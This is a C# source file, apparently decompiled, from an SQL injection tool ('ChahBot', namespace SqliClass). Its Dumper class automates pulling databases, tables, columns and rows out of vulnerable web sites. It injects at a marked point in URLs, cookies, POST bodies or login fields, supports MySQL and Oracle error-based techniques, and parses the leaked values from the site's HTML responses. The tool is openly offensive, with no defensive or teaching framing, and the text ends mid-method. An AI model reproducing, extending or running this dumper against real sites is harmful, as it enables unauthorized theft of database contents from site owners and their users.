using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ChahBot_1_0_Gacy.SqliClass
{
    class Dumper
    {
        private enum enTypeCount : byte
        {
            DBs,
            Tables,
            TablesAll,
            Columns,
            ColumnsAll,
            Rows,
            RowsAll,
            None
        }
        internal enum enTypeGUI : byte
        {
            Info,
            DataBases,
            Tables,
            Columns,
            Data,
            CustomData,
            Counter
        }

        private class WorkerResult
        {
            public Dictionary<int, string> ThreadSuccess;

            public Dictionary<int, string> ThreadFailed;

            public List<string> DumpFailed;

            public List<int> IndexFailed;

            public int RetryLimit;

            [CompilerGenerated]
            private int _RowsAdded;

            [CompilerGenerated]
            private int _AffectedRows;

            public int RowsAdded
            {
                get
                {
                    return this._RowsAdded;
                }
                set
                {
                    this._RowsAdded = value;
                }
            }

            public int AffectedRows
            {
                get
                {
                    return this._AffectedRows;
                }
                set
                {
                    this._AffectedRows = value;
                }
            }

            public WorkerResult()
            {
                this.ThreadSuccess = new Dictionary<int, string>();
                this.ThreadFailed = new Dictionary<int, string>();
                this.DumpFailed = new List<string>();
                this.IndexFailed = new List<int>();
                this.RetryLimit = 0;
            }

            public string Result()
            {
                return string.Format("Request Successed {0}, Failed {1}", this.ThreadSuccess.Count, this.ThreadFailed.Count);
            }
        }
        private delegate void DString(string sString);
        private delegate void DString2(string sString, string sString2);
        private delegate void DString3(string sString, string sString2, string sString3);
        private delegate void DString4(string sString, string sString2, string sString3, string sString4);
        private delegate void DAddDataRow(string sColunm, string sValue, int intIndex);
        private delegate object DGetObjectValue(object c);
        private delegate void DSetObjectValue(object c, object value);
        private delegate int DLGetNodeCount(Schema oT, string sDB, string sTable, string sCollumn);
        private frmDumpGrid __CurrDumpGrid;

        public class DumpThread
        {
            private Thread __Thread;

            private int __X;

            private int __Y;

            [CompilerGenerated]
            private int _TotalThreads;

            [CompilerGenerated]
            private int _TotalJob;

            [CompilerGenerated]
            private int _IndexJob;

            [CompilerGenerated]
            private int _AfectedRows;

            [CompilerGenerated]
            private string _DataBase;

            [CompilerGenerated]
            private string _Table;

            [CompilerGenerated]
            private List<string> _Columns;

            public int TotalThreads
            {
                get
                {
                    return this._TotalThreads;
                }
                set
                {
                    this._TotalThreads = value;
                }
            }

            public int TotalJob
            {
                get
                {
                    return this._TotalJob;
                }
                set
                {
                    this._TotalJob = value;
                }
            }

            public int IndexJob
            {
                get
                {
                    return this._IndexJob;
                }
                set
                {
                    this._IndexJob = value;
                }
            }

            public int AfectedRows
            {
                get
                {
                    return this._AfectedRows;
                }
                set
                {
                    this._AfectedRows = value;
                }
            }

            public string DataBase
            {
                get
                {
                    return this._DataBase;
                }
                set
                {
                    this._DataBase = value;
                }
            }

            public string Table
            {
                get
                {
                    return this._Table;
                }
                set
                {
                    this._Table = value;
                }
            }

            public List<string> Columns
            {
                get
                {
                    return this._Columns;
                }
                set
                {
                    this._Columns = value;
                }
            }

            public Thread Thread
            {
                get
                {
                    return this.__Thread;
                }
            }

            public int X
            {
                get
                {
                    return this.__X;
                }
            }

            public int Y
            {
                get
                {
                    return this.__Y;
                }
            }

            public DumpThread(Thread t, int x, int y)
            {
                this.__X = -1;
                this.__Y = 0;
                this.__Thread = t;
                this.__X = x;
                this.__Y = y;
                this.IndexJob = -1;
            }
        }

        private const bool MYSQL_DATA_TYPE = false;

	    private bool __RunningWorker;
	    private enTypeGUI __TypeGUI;
	    private WorkerResult __WorkerResult;
	    private SchemaDump __SchemaDump;
	    private string __CurrentDataBase;
	    private bool __RequestRetryExceeded;
	    private global::ThreadPool __ThreadPool;
        public Types __SQLType = new Types();
	    private enTypeCount __Counter;
	    private List<string> __ListEmptyRows;
	    public string __URL;
	    private const char EMPTY_ROW = ' ';
	    private const int INFINIT_LOOP = 1000000;
	    private const string STR_RETRY_EXCEDED = "retry limit exceeded";
	    private const string STR_CANCELED_BY_USER = "canceled by user";
	    private const string STR_LOADING_PLEASE_WAIT = "Dumper thread, loading please wait..";
	    private const char SPLIT_FLAG = '#';
	    private bool __DumpToFile;
	    private string __Traject;
	    private string __TrajectOneT;
	    private int __TrajectTotal;
	    private int __AftectedRows;
	    private bool __DumpGridAdded;
	    public const int TVIF_STATE = 8;
	    public const int TVIS_STATEIMAGEMASK = 61440;
	    public const int TV_FIRST = 4352;
	    public const int TVM_SETITEM = 4415;
	    private string cmbSqlType_SelectedIndexChanged_sFrom;
        private StaticLocalInitFlag cmbSqlType_SelectedIndexChanged_sSelect_Init = new StaticLocalInitFlag();
        private StaticLocalInitFlag cmbSqlType_SelectedIndexChanged_sFrom_Init = new StaticLocalInitFlag();
	    private string cmbSqlType_SelectedIndexChanged_sQuery2;
        private StaticLocalInitFlag cmbSqlType_SelectedIndexChanged_sQuery_Init = new StaticLocalInitFlag();
	    private long CheckRequestDelay_LastTick;
        private StaticLocalInitFlag cmbSqlType_SelectedIndexChanged_sQuery2_Init = new StaticLocalInitFlag();
	    private string cmbSqlType_SelectedIndexChanged_sQuery3;
        private StaticLocalInitFlag cmbSqlType_SelectedIndexChanged_sQuery3_Init = new StaticLocalInitFlag();
	    private StaticLocalInitFlag CheckRequestDelay_LastTick_Init = new StaticLocalInitFlag();
	    private string cmbSqlType_SelectedIndexChanged_sQuery;
	    private string cmbSqlType_SelectedIndexChanged_sSelect;
        private BackgroundWorker bckWorker = new BackgroundWorker();

        public int numSleep = 500;
        public int numFieldByField = 1;
        public int numMaxRetryColumn = 5;
        public int numLimitMax = 1;
        public int numLimitY = 1;
        public int numLimitX = 1;
        public int numMaxRetry = 1;
        public int numTimeOut = 5000;
        public int cmbInjectionPoint = 0;

        public bool chkThreads = false;
        public bool chkDumpFieldByField = false;
        public bool chkDumpEncodedHex = false;
        public bool chkDumpWhere = false;
        public bool chkDumpOrderBy = false;
        public bool chkMSSQL_Latin1 = true;
        public bool chkMSSQLCastAsChar = true;
        public bool chkOracleCastAsChar = true;
        public bool chkReDumpFailed = true;
        public bool chkLogin = true;
        public bool chkAutoScrollTree = true;
        public bool chkAllInOneRequest = true;
        public bool chkDumpIFNULL = true;

        public bool rdbMySQLCollactions0 = true;//None 
        public bool rdbMySQLCollactions1 = false;//UnHex  
        public bool rdbMySQLCollactions2 = false;//Binary
        public bool rdbMySQLCollactions3 = false;//CastAsChar
        public bool rdbMySQLCollactions4 = false;//Compress
        public bool rdbMySQLCollactions5 = false;//ConvertUtf8
        public bool rdbMySQLCollactions6 = false;//ConvertLatin1
        public bool rdbMySQLCollactions7 = false;//Aes_descrypt

        public bool rdbMySQLErrorType1 = true;//rdbMySQLErrorType1
        public bool rdbMySQLErrorType2 = false;//ExtractValue
        public bool rdbMySQLErrorType3 = false;//UpdateXML

        public bool rdbOracleErrorType1 = true;//GET_HOST_ADDRESS
        public bool rdbOracleErrorType2 = false;//DRITHSX_SN
        public bool rdbOracleErrorType3 = false;//GETMAPPINGXPATH

        public bool rdbOracleTopN_1 = true;//ROWNUM
        public bool rdbOracleTopN_2 = false;//RANK
        public bool rdbOracleTopN_3 = false;//DENSE_RANK

        public string txtUserName = "";
        public string txtPassword = "";
        public string txtSchemaWhere = "";
        public string txtPost = "";
        public string txtCustomQuery = "";
        public string txtCustomQueryFrom = "";
        public string txtSchemaOrderBy = "";
        public string txtCookies = "";
        public string txtURL = "";

        public string CurrentDataBase = "";

        public string lblUser = "";
        public string lblServer = "";
        public string lblVersion = "";
        public string lblDatabase = "";
        public string lblIP = "";
        public string lblCountry = "";
        public string lblCountBDs = "";

        public string cmbMSSQLCast = "";
        public string cmbMethod = "GET";

        public Dumper()
        {
            bckWorker.WorkerReportsProgress = true;
            bckWorker.WorkerSupportsCancellation = true;
            bckWorker.DoWork += new DoWorkEventHandler(bckWorker_DoWork);
            bckWorker.ProgressChanged += new ProgressChangedEventHandler(bckWorker_ProgressChanged);
            bckWorker.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bckWorker_RunWorkerCompleted);
        }

        private class SchemaDump
        {
            public class Node
            {
                [CompilerGenerated]
                private string _DataBase;

                [CompilerGenerated]
                private string _Table;

                [CompilerGenerated]
                private List<string> _Columns;

                [CompilerGenerated]
                private string _Query;

                public string DataBase
                {
                    get
                    {
                        return this._DataBase;
                    }
                    set
                    {
                        this._DataBase = value;
                    }
                }

                public string Table
                {
                    get
                    {
                        return this._Table;
                    }
                    set
                    {
                        this._Table = value;
                    }
                }

                public List<string> Columns
                {
                    get
                    {
                        return this._Columns;
                    }
                    set
                    {
                        this._Columns = value;
                    }
                }

                public string Query
                {
                    get
                    {
                        return this._Query;
                    }
                    set
                    {
                        this._Query = value;
                    }
                }

                public Node()
                {
                    this.DataBase = "";
                    this.Table = "";
                    this.Query = "";
                    this.Columns = new List<string>();
                }
            }

            public Dictionary<string, SchemaDump.Node> Items;

            public SchemaDump()
            {
                this.Items = new Dictionary<string, SchemaDump.Node>();
            }

            public SchemaDump.Node Item(int index)
            {
                checked
                {
                    try
                    {
                        Dictionary<string, SchemaDump.Node>.Enumerator enumerator = this.Items.GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            KeyValuePair<string, SchemaDump.Node> current = enumerator.Current;
                            int num = 0;
                            if (num.Equals(index))
                            {
                                return this.Items[current.Key];
                            }
                            num++;
                        }
                    }
                    finally
                    {
                    }
                    return null;
                }
            }

            public int Count()
            {
                return this.Items.Count;
            }

            public void AddDataBase(string sDataBase)
            {
                SchemaDump.Node node = new SchemaDump.Node();
                node.DataBase = sDataBase;
                this.Items.Add(sDataBase, node);
            }

            public void AddTable(string sDataBase, string sTable)
            {
                SchemaDump.Node node = this.Items[sDataBase];
                node.Table = sTable;
            }

            public void AddColumn(string sDataBase, string sTable, string sColumn)
            {
                SchemaDump.Node node = this.Items[sDataBase];
                if (!node.Columns.Contains(sColumn))
                {
                    node.Columns.Add(sColumn);
                }
            }

            public void AddQuery(string sDataBase, string sTable, string sQuery)
            {
                SchemaDump.Node node = this.Items[sDataBase];
                node.Query = sQuery;
            }
        }

        internal List<string> ParseHtmlData(string sData, Types o)
        {
            List<string> result;
            lock (this)
            {
                Types _SQLType = this.__SQLType;
                this.__SQLType = o;
                result = this.ParseHtmlData(sData, true);
                this.__SQLType = _SQLType;
            }
            return result;
        }
        private List<string> ParseHtmlData(string sData, bool bIsExternal = false)
        {
            List<string> list = new List<string>();
            checked
            {
               /* try
                {*/
                    string text = "";
                    if (Conversions.ToBoolean(Operators.AndObject(this.__SQLType == Types.MySQL_With_Error, Operators.OrObject(bIsExternal, true /*this.GetObjectValue(this.rdbMySQLErrorType1)*/))))
                    {
                        int num = sData.ToLower().IndexOf("Duplicate entry".ToLower());
                        if (num >= 0)
                        {
                            sData = sData.Substring(num);
                            text = sData.Substring(sData.IndexOf("'") + 1);
                            if (text.ToLower().StartsWith(global::Globals.DATA_SPLIT_STR.ToLower()))
                            {
                                text = text.Substring(global::Globals.DATA_SPLIT_STR.Length);
                                text = text.Substring(0, text.IndexOf("'"));
                            }
                            else
                            {
                                text = Strings.Split(text, global::Globals.DATA_SPLIT_STR, -1, CompareMethod.Binary)[0];
                            }
                        }
                        else
                        {
                            num = sData.ToLower().IndexOf(global::Globals.DATA_SPLIT_STR.ToLower());
                            if (num > 0)
                            {
                                text = sData.Substring(num + global::Globals.DATA_SPLIT_STR.Length);
                            }
                        }
                        if (text.ToLower().IndexOf("for key".ToLower()) > 1 & text.IndexOf("'") > 1)
                        {
                            text = text.Substring(0, text.ToLower().IndexOf("for key"));
                            text = text.Substring(0, text.LastIndexOf("'"));
                        }
                        if (text.ToLower().IndexOf(global::Globals.DATA_SPLIT_STR.ToLower()) > 0)
                        {
                            if (text.ToLower().StartsWith(global::Globals.DATA_SPLIT_STR.ToLower()))
                            {
                                text = Strings.Split(text, global::Globals.DATA_SPLIT_STR, -1, CompareMethod.Binary)[1];
                            }
                            else
                            {
                                text = Strings.Split(text, global::Globals.DATA_SPLIT_STR, -1, CompareMethod.Binary)[0];
                            }
                        }
                        if (text.EndsWith("'11"))
                        {
                            text = text.Substring(0, text.Length - 3);
                        }
                        else if (text.EndsWith("'1"))
                        {
                            text = text.Substring(0, text.Length - 2);
                        }
                    }
                    else
                    {
                        if (this.DumpWithVariousT())
                        {
                            RegExp regExp = new RegExp();
                            Hashtable data = regExp.GetData(sData, global::Globals.DATA_SPLIT_STR + "(.+)" + global::Globals.DATA_SPLIT_STR);
                            Hashtable hashtable = new Hashtable();
                            try
                            {
                                IEnumerator enumerator = data.Values.GetEnumerator();
                                while (enumerator.MoveNext())
                                {
                                    string text2 = Conversions.ToString(enumerator.Current);
                                    string[] array;
                                    if (text2.Contains(global::Globals.DATA_SPLIT_STR))
                                    {
                                        array = Strings.Split(text2, global::Globals.DATA_SPLIT_STR, -1, CompareMethod.Binary);
                                    }
                                    else
                                    {
                                        array = new string[]
									{
										text2
									};
                                    }
                                    string[] array2 = array;
                                    for (int i = 0; i < array2.Length; i++)
                                    {
                                        string text3 = array2[i];
                                        if (text3.Contains(global::Globals.COLLUMNS_SPLIT_STR) && !hashtable.Contains(text3))
                                        {
                                            hashtable.Add(text3, text3);
                                        }
                                    }
                                }
                            }
                            finally
                            {
                                IEnumerator enumerator = null;
                                if (enumerator is IDisposable)
                                {
                                    (enumerator as IDisposable).Dispose();
                                }
                            }
                            try
                            {
                                IEnumerator enumerator2 = hashtable.Values.GetEnumerator();
                                while (enumerator2.MoveNext())
                                {
                                    string item = Conversions.ToString(enumerator2.Current);
                                    if (!list.Contains(item))
                                    {
                                        list.Add(item);
                                    }
                                    if (list.Count >= this.__TrajectTotal)
                                    {
                                        break;
                                    }
                                }
                            }
                            finally
                            {
                                IEnumerator enumerator2 = null;
                                if (enumerator2 is IDisposable)
                                {
                                    (enumerator2 as IDisposable).Dispose();
                                }
                            }
                            try
                            {
                                IEnumerator enumerator3 = hashtable.Values.GetEnumerator();
                                while (enumerator3.MoveNext())
                                {
                                    string item2 = Conversions.ToString(enumerator3.Current);
                                    if (list.Count >= this.__TrajectTotal)
                                    {
                                        break;
                                    }
                                    list.Add(item2);
                                }
                            }
                            finally
                            {
                                IEnumerator enumerator3 = null;
                                if (enumerator3 is IDisposable)
                                {
                                    (enumerator3 as IDisposable).Dispose();
                                }
                            }
                            if (list.Count != 0)
                            {
                                return list;
                            }
                        }
                        int num = sData.IndexOf(global::Globals.DATA_SPLIT_STR);
                        if (num >= 0)
                        {
                            text = sData.Substring(num + global::Globals.DATA_SPLIT_STR.Length);
                            if (text.StartsWith(global::Globals.DATA_SPLIT_STR))
                            {
                                text = " ";
                            }
                            else
                            {
                                num = text.IndexOf(global::Globals.DATA_SPLIT_STR);
                                if (num > 0)
                                {
                                    text = text.Substring(0, num);
                                }
                                else
                                {
                                    int[] array3 = new int[]
								{
									text.IndexOf('<'),
									text.IndexOf('>'),
									text.IndexOf('"')
								};
                                    num = text.Length;
                                    int[] array4 = array3;
                                    for (int j = 0; j < array4.Length; j++)
                                    {
                                        int num2 = array4[j];
                                        if (num > num2 & num2 > 0)
                                        {
                                            num = num2;
                                        }
                                    }
                                    text = text.Substring(0, num);
                                }
                            }
                        }
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(this.__SQLType == Types.MySQL_No_Error & (this.__TypeGUI == enTypeGUI.DataBases | this.__TypeGUI == enTypeGUI.Tables | this.__TypeGUI == enTypeGUI.Columns), true /*GetObjectValue(this.chkAllInOneRequest)*/), text.Contains(","))))
                        {
                            string[] array5 = Strings.Split(text, ",", -1, CompareMethod.Binary);
                            int arg_4D2_0 = 0;
                            int num3 = array5.Length - 1;
                            int num4 = 0;
                            for (int k = arg_4D2_0; k <= num3; k++)
                            {
                                bool flag = true;
                                if (true == array5[k].Contains("<"))
                                {
                                    break;
                                }
                                if (flag == array5[k].Contains(">"))
                                {
                                    break;
                                }
                                if (flag == array5[k].Contains(" "))
                                {
                                    break;
                                }
                                if (flag == array5[k].Contains("\""))
                                {
                                    break;
                                }
                                if (flag == array5[k].Contains("."))
                                {
                                    break;
                                }
                                if (flag == array5[k].Contains("/"))
                                {
                                    break;
                                }
                                if (flag == array5[k].Contains("\\"))
                                {
                                    break;
                                }
                                if (flag == string.IsNullOrEmpty(array5[k]))
                                {
                                    break;
                                }
                                num4 = k;
                            }
                            int arg_59A_0 = 0;
                            int num5 = num4 = 0;
                            for (int l = arg_59A_0; l <= num5; l++)
                            {
                                list.Add(array5[l].Trim());
                            }
                        }
                        else
                        {
                            list.Add(text.Trim());
                        }
                        if (Utls.TypeIsMSSQL(this.__SQLType))
                        {
                            int arg_5E0_0 = 0;
                            int num6 = list.Count - 1;
                            for (int m = arg_5E0_0; m <= num6; m++)
                            {
                                text = list[m];
                                if (text.Contains("' to a column of data type int."))
                                {
                                    text = text.Replace("' to a column of data type int.", "");
                                    list[m] = text;
                                }
                            }
                        }
                    }
                /*}
                catch (Exception expr_622)
                {
                    ProjectData.SetProjectError(expr_622);
                    ProjectData.ClearProjectError();
                }*/
                return list;
            }
        }

        [AccessedThroughProperty("bckWorker")]
        private BackgroundWorker _bckWorker = new BackgroundWorker();

        [AccessedThroughProperty("trwSchema")]
        private TreeView _trwSchema = new TreeView();

        TreeView trwSchema = new TreeView();

        private object GetObjectValue(object c)
        {
            /*if (this.Me().InvokeRequired)
            {
                return this.Me().Invoke(new DGetObjectValue(this.GetObjectValue), new object[]
			    {
				    RuntimeHelpers.GetObjectValue(c)
			    });
            }*/
            bool flag = true;
            if (true == c is ComboBox)
            {
                /*if (c == this.cmbMSSQLCast)
                {
                    return ((ComboBox)c).Text.Trim();
                }
                return ((ComboBox)c).SelectedIndex;*/
                return null;
            }
            else
            {
                if (flag == c is String)
                {
                    return c;
                }
                if (flag == c is Boolean)
                {
                    return c;
                }
                if (flag == c is Int16)
                {
                }
                if (flag == c is TextBox)
                {
                    return ((TextBox)c).Text;
                }
                if (flag == c is CheckBox)
                {
                    return ((CheckBox)c).Checked;
                }
                if (flag == c is RadioButton)
                {
                    return ((RadioButton)c).Checked;
                }
                if (flag == c is ToolStripButton)
                {
                    return ((ToolStripButton)c).Checked;
                }
                if (flag == c is ToolStripLabel)
                {
                    return ((ToolStripLabel)c).Text;
                }
                if (flag == c is NumericUpDown)
                {
                    return ((NumericUpDown)c).Value;
                }
                if (flag == c is TrackBar)
                {
                    return ((TrackBar)c).Value;
                }
                if (flag == c is TreeView)
                {
                    return ((TreeView)c).Handle;
                }
                return c;

                throw new Exception("Bad Changed GetObjectValue");
            }
        }
        private void SetObjectValue(object c, object v)
        {

            bool flag = true;

            if (true == c is Boolean)
            {
                c = v;
            }
            if (true == c is ComboBox)
            {
                ((ComboBox)c).SelectedIndex = Conversions.ToInteger(v);
            }
            else if (flag == c is TextBox)
            {
                ((TextBox)c).Text = Conversions.ToString(v);
            }
            else if (flag == c is CheckBox)
            {
                ((CheckBox)c).Checked = Conversions.ToBoolean(v);
            }
            else if (flag == c is RadioButton)
            {
                ((RadioButton)c).Checked = Conversions.ToBoolean(v);
            }
            else if (flag == c is ToolStripButton)
            {
                ((ToolStripButton)c).Checked = Conversions.ToBoolean(v);
            }
            else if (flag == c is ToolStripLabel)
            {
                ((ToolStripLabel)c).Text = Conversions.ToString(v);
            }
            else if (flag == c is NumericUpDown)
            {
                ((NumericUpDown)c).Value = Conversions.ToDecimal(v);
            }
            else
            {
                if (flag != c is TrackBar)
                {
                    throw new Exception("Bad Changed SetObjectValue");
                }
                ((TrackBar)c).Value = Conversions.ToInteger(v);
            }
        }
        private void UpDateStatus(string sDesc)
        {
            Console.Write(sDesc);

            if (!sDesc.StartsWith("["))
            {
                //global::Globals.UpDateStatus("Dumper thread, " + sDesc);
            }
            else
            {
                //global::Globals.UpDateStatus(sDesc);
            }
        }
        public void StartWorker(enTypeGUI o)
        {
            if (this.__RunningWorker)
            {
                return;
            }
            bool flag = false;
            switch (cmbInjectionPoint)
            {
                case 0:
                    flag = (this.txtURL.IndexOf("[t]") > 0);
                    break;
                case 1:
                    flag = (this.txtCookies.IndexOf("[t]") >= 0);
                    break;
                case 2:
                    flag = (this.txtPost.IndexOf("[t]") >= 0);
                    break;
                case 3:
                    flag = (this.txtUserName.IndexOf("[t]") >= 0);
                    break;
                case 4:
                    flag = (this.txtPassword.IndexOf("[t]") >= 0);
                    break;
            }
            if (!flag)
            {
                this.UpDateStatus("Variable '[t]' not found, check the injection point.");
                Interaction.Beep();
                return;
            }
            this.__TypeGUI = o;
            this.__WorkerResult = new WorkerResult();
            this.__SchemaDump = new SchemaDump();
            this.__RequestRetryExceeded = false;
            this.__DumpGridAdded = false;
            this.__ListEmptyRows = new List<string>();
            if (this.__TypeGUI == enTypeGUI.Data | this.__TypeGUI == enTypeGUI.CustomData)
            {
                this.__CurrDumpGrid = new frmDumpGrid();
            }
            checked
            {
                if (this.__TypeGUI == enTypeGUI.CustomData)
                {
                    if (Utls.TypeIsMySQL(this.__SQLType))
                    {
                        string text = this.txtCustomQueryFrom.Trim();
                        if (!string.IsNullOrEmpty(text))
                        {
                            text = "from " + text;
                        }
                        this.QueryFixLines(ref text);
                        this.__SchemaDump.AddDataBase("DataBase");
                        this.__SchemaDump.AddTable("DataBase", "Table");
                        this.__SchemaDump.AddQuery("DataBase", "Table", text);
                        string[] array = this.txtCustomQuery.Split(new char[]
				        {
					        ','
				        });
                        string[] array2 = array;
                        for (int i = 0; i < array2.Length; i++)
                        {
                            string text2 = array2[i];
                            if (!string.IsNullOrEmpty(text2))
                            {
                                this.__SchemaDump.AddColumn("DataBase", "Table", text2.Trim());
                            }
                        }
                        bool flag2 = false;
                        try
                        {
                            Dictionary<string, SchemaDump.Node>.Enumerator enumerator = this.__SchemaDump.Items.GetEnumerator();
                            while (enumerator.MoveNext())
                            {
                                KeyValuePair<string, SchemaDump.Node> current = enumerator.Current;
                                if (flag2 = !string.IsNullOrEmpty(current.Value.DataBase))
                                {
                                    break;
                                }
                            }
                        }
                        finally
                        {
                        }
                        if (!flag2)
                        {
                            this.UpDateStatus("invalid role for Select statement.");
                            Interaction.Beep();
                            return;
                        }
                    }
                    else
                    {
                        string text3 = this.txtCustomQuery.Trim();
                        this.QueryFixLines(ref text3);
                        if (string.IsNullOrEmpty(text3))
                        {
                            this.UpDateStatus("SQL query empty.");
                            Interaction.Beep();
                            return;
                        }
                        this.__SchemaDump.AddDataBase("DataBase");
                        this.__SchemaDump.AddTable("DataBase", "Table");
                        this.__SchemaDump.AddQuery("DataBase", "Table", text3);
                    }
                }
                else
                {
                    if (this.__TypeGUI == enTypeGUI.Counter)
                    {
                        if (this.trwSchema.SelectedNode == null & this.__Counter != enTypeCount.DBs)
                        {
                            Interaction.Beep();
                            return;
                        }
                        string sDataBase;
                        string sTable;
                        if (this.trwSchema.SelectedNode != null)
                        {
                            if (this.trwSchema.SelectedNode.Parent == null)
                            {
                                sDataBase = this.NodeRemoveCount(this.trwSchema.SelectedNode.Text);
                            }
                            else
                            {
                                sDataBase = this.NodeRemoveCount(this.trwSchema.SelectedNode.Parent.Text);
                            }
                            sTable = this.NodeRemoveCount(this.trwSchema.SelectedNode.Text);
                        }
                        else
                        {
                            sDataBase = "DataBase";
                            sTable = "Table";
                        }
                        this.__SchemaDump.AddDataBase(sDataBase);
                        this.__SchemaDump.AddTable(sDataBase, sTable);
                        switch (this.__Counter)
                        {
                            case enTypeCount.DBs:
                                goto IL_8ED;
                            case enTypeCount.Tables:
                                this.__SchemaDump.AddColumn(sDataBase, sTable, this.NodeRemoveCount(this.trwSchema.SelectedNode.Text));
                                goto IL_8ED;
                            case enTypeCount.TablesAll:
                                try
                                {
                                    IEnumerator enumerator2 = this.trwSchema.Nodes.GetEnumerator();
                                    while (enumerator2.MoveNext())
                                    {
                                        TreeNode treeNode = (TreeNode)enumerator2.Current;
                                        this.__SchemaDump.AddColumn(sDataBase, sTable, this.NodeRemoveCount(treeNode.Text));
                                    }
                                    goto IL_8ED;
                                }
                                finally
                                {
                                }
                                break;
                            case enTypeCount.Columns:
                                break;
                            case enTypeCount.ColumnsAll:
                                try
                                {
                                    IEnumerator enumerator3 = this.trwSchema.SelectedNode.Parent.Nodes.GetEnumerator();
                                    while (enumerator3.MoveNext())
                                    {
                                        TreeNode treeNode2 = (TreeNode)enumerator3.Current;
                                        this.__SchemaDump.AddColumn(sDataBase, sTable, this.NodeRemoveCount(treeNode2.Text));
                                    }
                                    goto IL_8ED;
                                }
                                finally
                                {
                                }
                                goto IL_507;
                            case enTypeCount.Rows:
                                goto IL_507;
                            case enTypeCount.RowsAll:
                                try
                                {
                                    IEnumerator enumerator4 = this.trwSchema.SelectedNode.Parent.Nodes.GetEnumerator();
                                    while (enumerator4.MoveNext())
                                    {
                                        TreeNode treeNode3 = (TreeNode)enumerator4.Current;
                                        this.__SchemaDump.AddColumn(sDataBase, sTable, this.NodeRemoveCount(treeNode3.Text));
                                    }
                                    goto IL_8ED;
                                }
                                finally
                                {
                                }
                                goto IL_59D;
                            default:
                                goto IL_8ED;
                        }
                        this.__SchemaDump.AddColumn(sDataBase, sTable, this.NodeRemoveCount(this.trwSchema.SelectedNode.Text));
                        goto IL_8ED;
                    IL_507:
                        this.__SchemaDump.AddColumn(sDataBase, sTable, this.NodeRemoveCount(this.trwSchema.SelectedNode.Text));
                        goto IL_8ED;
                    }
                IL_59D:
                    if (this.__TypeGUI != enTypeGUI.Info)
                    {
                        if (this.trwSchema.SelectedNode != null)
                        {
                            TreeNode selectedNode = this.trwSchema.SelectedNode;
                            string[] array3 = selectedNode.FullPath.Split(new char[]
					        {
						        Conversions.ToChar(selectedNode.TreeView.PathSeparator)
					        });
                            int arg_5FC_0 = 0;
                            int num = array3.Length - 1;
                            for (int j = arg_5FC_0; j <= num; j++)
                            {
                                array3[j] = this.NodeRemoveCount(array3[j]);
                            }
                            switch (selectedNode.Level)
                            {
                                case 0:
                                    this.__SchemaDump.AddDataBase(array3[0]);
                                    break;
                                case 1:
                                case 2:
                                case 3:
                                    this.__SchemaDump.AddDataBase(array3[0]);
                                    this.__SchemaDump.AddTable(array3[0], array3[1]);
                                    if (selectedNode.Level == 1)
                                    {
                                        try
                                        {
                                            IEnumerator enumerator5 = selectedNode.Nodes.GetEnumerator();
                                            while (enumerator5.MoveNext())
                                            {
                                                TreeNode treeNode4 = (TreeNode)enumerator5.Current;
                                                if (treeNode4.Checked)
                                                {
                                                    this.__SchemaDump.AddColumn(array3[0], array3[1], treeNode4.Text);
                                                }
                                            }
                                            break;
                                        }
                                        finally
                                        {
                                        }
                                    }
                                    if (selectedNode.Level == 2)
                                    {
                                        try
                                        {
                                            IEnumerator enumerator6 = selectedNode.Parent.Nodes.GetEnumerator();
                                            while (enumerator6.MoveNext())
                                            {
                                                TreeNode treeNode5 = (TreeNode)enumerator6.Current;
                                                if (treeNode5.Checked)
                                                {
                                                    this.__SchemaDump.AddColumn(array3[0], array3[1], treeNode5.Text);
                                                }
                                            }
                                            break;
                                        }
                                        finally
                                        {
                                        }
                                    }
                                    if (selectedNode.Level == 2)
                                    {
                                        try
                                        {
                                            IEnumerator enumerator7 = selectedNode.Parent.Parent.Nodes.GetEnumerator();
                                            while (enumerator7.MoveNext())
                                            {
                                                TreeNode treeNode6 = (TreeNode)enumerator7.Current;
                                                if (treeNode6.Checked)
                                                {
                                                    this.__SchemaDump.AddColumn(array3[0], array3[1], treeNode6.Text);
                                                }
                                            }
                                        }
                                        finally
                                        {
                                        }
                                    }
                                    break;
                            }
                        }
                        switch (o)
                        {
                            case enTypeGUI.Tables:
                                if (this.__SchemaDump.Count() == 0)
                                {
                                    this.UpDateStatus("check the DataBase(s)");
                                    Interaction.Beep();
                                    return;
                                }
                                break;
                            case enTypeGUI.Columns:
                                {
                                    bool flag3 = false;
                                    try
                                    {
                                        Dictionary<string, SchemaDump.Node>.Enumerator enumerator8 = this.__SchemaDump.Items.GetEnumerator();
                                        while (enumerator8.MoveNext())
                                        {
                                            KeyValuePair<string, SchemaDump.Node> current2 = enumerator8.Current;
                                            if (flag3 = !string.IsNullOrEmpty(current2.Value.DataBase))
                                            {
                                                break;
                                            }
                                        }
                                    }
                                    finally
                                    {
                                    }
                                    if (!flag3)
                                    {
                                        this.UpDateStatus("check the Column(s)");
                                        Interaction.Beep();
                                        return;
                                    }
                                    break;
                                }
                            case enTypeGUI.Data:
                                {
                                    bool flag4 = false;
                                    try
                                    {
                                        Dictionary<string, SchemaDump.Node>.Enumerator enumerator9 = this.__SchemaDump.Items.GetEnumerator();
                                        while (enumerator9.MoveNext())
                                        {
                                            KeyValuePair<string, SchemaDump.Node> current3 = enumerator9.Current;
                                            if (flag4 = ((string.IsNullOrEmpty(current3.Value.Table) || current3.Value.Columns.Count <= 0) ? false : true))
                                            {
                                                break;
                                            }
                                        }
                                    }
                                    finally
                                    {
                                    }
                                    if (!flag4)
                                    {
                                        this.UpDateStatus("check the column(s)");
                                        Interaction.Beep();
                                        return;
                                    }
                                    break;
                                }
                        }
                    }
                }
            IL_8ED:
                this.__RunningWorker = true;
                this.bckWorker.RunWorkerAsync();
            }
        }

        private void StopedWorker(string desc)
        {
            string text = "";
            switch (this.__TypeGUI)
            {
                case enTypeGUI.DataBases:
                    text = "DataBases";
                    break;
                case enTypeGUI.Tables:
                    text = "Tables";
                    break;
                case enTypeGUI.Columns:
                    text = "Columns";
                    break;
                case enTypeGUI.Data:
                    text = "Rows";
                    break;
                case enTypeGUI.CustomData:
                    text = "Rows";
                    break;
            }
            checked
            {
